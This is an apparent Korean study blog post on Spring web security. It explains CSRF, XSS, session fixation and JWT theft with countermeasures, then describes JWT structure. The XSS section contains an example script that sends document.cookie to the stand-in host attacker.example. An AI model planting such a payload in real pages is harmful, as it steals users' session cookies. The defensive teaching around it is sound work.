---
layout: post
title: "Weekly Paper 14 - Spring 보안 공격과 JWT 구조"
---

# Weekly Paper 14 - Spring 보안 공격과 JWT 구조

이번 글은 위클리페이퍼 14 주제인 Spring 기반 웹 애플리케이션의 주요 보안 공격과 JWT 구조를 정리한 글이다.

핵심 질문은 두 가지다.

1. Spring 기반 웹 애플리케이션에서 발생할 수 있는 주요 보안 공격은 무엇이고, 어떻게 대응할 수 있을까?
2. JWT는 어떤 구조로 되어 있고, 각 구성 요소는 어떤 역할을 할까?

## Q1. Spring 기반 웹 애플리케이션에서 발생할 수 있는 4가지 주요 보안 공격

대표적으로 다음 네 가지를 볼 수 있다.

- CSRF
- XSS
- 세션 고정
- JWT 탈취

각 공격은 모두 "인증된 사용자" 또는 "사용자의 브라우저"를 악용한다는 공통점이 있다.

## 1. CSRF

CSRF는 Cross-Site Request Forgery의 줄임말이다.

한국어로는 사이트 간 요청 위조라고 한다.

쉽게 말하면, 사용자가 이미 로그인한 상태를 악용해서 공격자가 원하지 않는 요청을 대신 보내게 만드는 공격이다.

예를 들어 사용자가 어떤 서비스에 로그인한 상태라고 하자. 브라우저에는 로그인 쿠키가 들어 있다.

공격자는 사용자를 악성 페이지로 유도하고, 그 페이지에서 다음과 같은 요청을 몰래 보내게 만들 수 있다.

```text
POST /api/users/delete
```

브라우저는 해당 사이트의 쿠키를 자동으로 함께 보낼 수 있다. 서버 입장에서는 로그인한 사용자의 정상 요청처럼 보일 수 있다.

### CSRF 대응 전략

Spring Security에서는 기본적으로 CSRF 보호 기능을 제공한다.

대표적인 대응 방식은 CSRF 토큰을 사용하는 것이다.

```text
1. 서버가 CSRF 토큰을 발급한다.
2. 클라이언트는 상태 변경 요청에 CSRF 토큰을 함께 보낸다.
3. 서버는 쿠키 또는 세션에 저장된 토큰과 요청의 토큰을 비교한다.
4. 토큰이 맞지 않으면 요청을 거부한다.
```

Spring Security에서는 다음과 같은 설정을 사용할 수 있다.

```java
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
);
```

CSR 또는 SPA 환경에서는 프론트엔드가 CSRF 토큰을 읽어서 요청 헤더에 넣어야 하므로 `HttpOnly`를 `false`로 설정하는 경우가 있다.

다만 이 경우 XSS에 취약해지면 CSRF 토큰도 노출될 수 있으므로 XSS 방어도 함께 중요하다.

## 2. XSS

XSS는 Cross-Site Scripting의 줄임말이다.

공격자가 웹 페이지에 악성 JavaScript 코드를 삽입하고, 다른 사용자의 브라우저에서 그 코드가 실행되게 만드는 공격이다.

예를 들어 게시글이나 채팅 메시지에 다음과 같은 스크립트가 저장된다고 하자.

```html
<script>
  fetch("https://attacker.example/steal?cookie=" + document.cookie)
</script>
```

이 코드가 다른 사용자의 브라우저에서 실행되면 쿠키나 화면의 민감한 정보가 공격자에게 전송될 수 있다.

### XSS 대응 전략

가장 기본적인 대응은 사용자 입력을 그대로 HTML로 렌더링하지 않는 것이다.

일반적인 대응 전략은 다음과 같다.

- 사용자 입력값을 HTML escape 처리한다.
- React 같은 프론트엔드 프레임워크의 기본 escape 기능을 유지한다.
- `dangerouslySetInnerHTML` 같은 기능은 꼭 필요한 경우에만 사용한다.
- 쿠키에는 가능한 `HttpOnly` 옵션을 적용한다.
- Content Security Policy를 적용해 실행 가능한 스크립트 범위를 제한한다.

Spring 서버 쪽에서는 사용자 입력 검증도 중요하다.

예를 들어 입력값 길이, 형식, 허용 가능한 문자 등을 검증해 비정상적인 데이터를 줄일 수 있다.

```java
@Size(max = 2000)
String content
```

하지만 XSS 방어의 핵심은 "입력 검증"만이 아니라 "출력 시 안전하게 렌더링"하는 것이다.

## 3. 세션 고정

세션 고정은 Session Fixation 공격이라고 한다.

공격자가 미리 알고 있는 세션 ID를 피해자에게 사용하게 만든 뒤, 피해자가 로그인하면 그 세션 ID로 공격자가 로그인 상태를 가로채는 공격이다.

흐름은 대략 다음과 같다.

```text
1. 공격자가 서버에서 세션 ID를 하나 얻는다.
2. 피해자가 그 세션 ID를 사용하도록 유도한다.
3. 피해자가 로그인한다.
4. 서버가 로그인 후에도 같은 세션 ID를 유지한다.
5. 공격자는 같은 세션 ID로 로그인 상태를 사용한다.
```

문제의 핵심은 로그인 전과 로그인 후의 세션 ID가 같다는 점이다.

### 세션 고정 대응 전략

Spring Security는 기본적으로 로그인 성공 시 세션 ID를 변경하는 방식으로 세션 고정 공격을 방어한다.

즉, 로그인 전 세션과 로그인 후 세션을 분리한다.

```java
http.sessionManagement(session -> session
    .sessionFixation(sessionFixation -> sessionFixation.migrateSession())
);
```

Spring Security의 기본 설정을 사용하면 보통 별도 설정 없이도 세션 고정 보호가 적용된다.

JWT 기반 인증처럼 세션을 사용하지 않는 구조에서는 세션 고정 공격의 영향이 줄어든다. 하지만 세션 기반 로그인, 관리자 페이지, SSR 서비스에서는 여전히 중요한 공격이다.

## 4. JWT 탈취

JWT 탈취는 access token 또는 refresh token이 공격자에게 노출되는 상황이다.

JWT는 서버가 서명한 토큰이기 때문에, 공격자가 토큰 값을 그대로 훔치면 비밀번호를 몰라도 해당 사용자인 것처럼 API를 호출할 수 있다.

예를 들어 access token이 브라우저의 `localStorage`에 저장되어 있고, XSS 공격이 성공하면 공격자는 JavaScript로 토큰을 읽을 수 있다.

```javascript
localStorage.getItem("accessToken");
```

### JWT 탈취 대응 전략

JWT 탈취를 완전히 막기는 어렵다. 그래서 노출 가능성을 줄이고, 노출되더라도 피해 범위를 줄이는 전략이 필요하다.

대표적인 대응은 다음과 같다.

- access token 만료 시간을 짧게 둔다.
- refresh token은 `HttpOnly`, `Secure`, `SameSite` 쿠키로 저장한다.
- HTTPS를 사용한다.
- refresh token rotation을 적용한다.
- 로그아웃 시 서버 쪽 token registry 또는 blacklist에서 토큰을 무효화한다.
- 권한 변경 시 기존 토큰을 무효화한다.
- XSS 방어를 철저히 한다.

JWT는 stateless 인증에 자주 쓰이지만, 로그아웃이나 강제 만료가 필요하다면 서버 쪽에서 토큰 상태를 일부 관리해야 한다.

예를 들어 프로젝트에서는 `JwtRegistry` 같은 구조로 현재 유효한 토큰을 관리할 수 있다.

## Q2. JWT의 구조와 각 구성 요소의 역할

JWT는 세 부분으로 구성된다.

```text
Header.Payload.Signature
```

각 부분은 점(`.`)으로 구분된다.

예시는 다음과 같은 형태다.

```text
xxxxx.yyyyy.zzzzz
```

실제 값은 Base64Url 방식으로 인코딩되어 있다.

## 1. Header

Header는 토큰의 메타데이터를 담는다.

주로 두 가지 정보가 들어간다.

- 토큰 타입
- 서명 알고리즘

예시는 다음과 같다.

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

`typ`는 이 토큰이 JWT라는 뜻이다.

`alg`는 서명에 사용할 알고리즘이다. 예를 들어 `HS256`은 HMAC SHA-256 알고리즘을 사용한다는 뜻이다.

서버는 Header를 보고 어떤 방식으로 Signature를 검증해야 하는지 알 수 있다.

## 2. Payload

Payload는 토큰에 담을 실제 정보를 가진다.

Payload 안의 정보 하나하나를 claim이라고 부른다.

예시는 다음과 같다.

```json
{
  "sub": "user-id",
  "username": "testuser",
  "role": "USER",
  "iat": 1710000000,
  "exp": 1710001800
}
```

자주 쓰이는 claim은 다음과 같다.

| Claim | 의미 |
| --- | --- |
| `sub` | subject, 토큰의 주인 |
| `iat` | issued at, 토큰 발급 시각 |
| `exp` | expiration, 토큰 만료 시각 |
| `iss` | issuer, 토큰 발급자 |
| `aud` | audience, 토큰 대상 |
| `jti` | JWT ID, 토큰의 고유 식별자 |

Payload에는 사용자 ID, 권한, 토큰 타입 같은 정보를 넣을 수 있다.

하지만 중요한 점이 있다.

Payload는 암호화된 것이 아니라 인코딩된 것이다.

즉, 누구나 디코딩해서 내용을 볼 수 있다.

그래서 Payload에는 비밀번호, 주민등록번호, API secret 같은 민감한 정보를 넣으면 안 된다.

## 3. Signature

Signature는 토큰이 변조되지 않았는지 확인하기 위한 서명이다.

서버는 Header와 Payload를 합친 뒤, 비밀키 또는 개인키를 사용해 서명을 만든다.

단순화하면 이런 흐름이다.

```text
서명 = HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

누군가 Payload의 role을 `USER`에서 `ADMIN`으로 바꾸면 어떻게 될까?

Payload 값은 바뀌지만, 공격자는 서버의 비밀키를 모르기 때문에 올바른 Signature를 다시 만들 수 없다.

서버가 검증할 때 Signature가 맞지 않으므로 토큰은 거부된다.

즉, Signature의 역할은 "이 토큰이 서버가 발급한 원본 그대로인가?"를 확인하는 것이다.

## JWT 검증 흐름

서버가 JWT를 검증할 때는 보통 다음을 확인한다.

```text
1. 토큰 형식이 Header.Payload.Signature 구조인가?
2. Signature가 올바른가?
3. 만료 시간이 지나지 않았는가?
4. 필요한 claim이 들어 있는가?
5. 서버 정책상 아직 활성 토큰인가?
```

Spring Security에서는 직접 JWT를 이해하는 것이 아니라, 보통 커스텀 필터를 만들어 요청 헤더에서 토큰을 꺼내고 검증한다.

검증에 성공하면 `Authentication` 객체를 만들고 `SecurityContext`에 저장한다.

```text
Authorization 헤더
  ↓
JWT 필터
  ↓
토큰 검증
  ↓
Authentication 생성
  ↓
SecurityContext 저장
```

이후 Controller나 Service에서는 현재 사용자를 인증된 사용자로 다룰 수 있다.

## 정리

Spring 기반 웹 애플리케이션에서는 CSRF, XSS, 세션 고정, JWT 탈취 같은 공격을 고려해야 한다.

CSRF는 사용자의 로그인 쿠키를 악용한 요청 위조이고, CSRF 토큰으로 방어한다.

XSS는 브라우저에서 악성 스크립트를 실행시키는 공격이고, escape 처리와 `HttpOnly` 쿠키, CSP 등으로 방어한다.

세션 고정은 로그인 전 세션 ID를 로그인 후에도 유지하게 만드는 공격이고, 로그인 성공 시 세션 ID를 바꿔 방어한다.

JWT 탈취는 토큰 자체가 노출되는 문제이고, 짧은 만료 시간, 안전한 쿠키 저장, refresh token rotation, 토큰 무효화 전략으로 피해를 줄인다.

JWT는 `Header.Payload.Signature` 구조이며, Header는 알고리즘 정보, Payload는 claim, Signature는 변조 여부 검증을 담당한다.

JWT의 Payload는 누구나 읽을 수 있으므로 민감한 정보를 넣으면 안 된다. JWT의 핵심은 내용을 숨기는 것이 아니라, 서명을 통해 변조 여부를 확인하는 것이다.


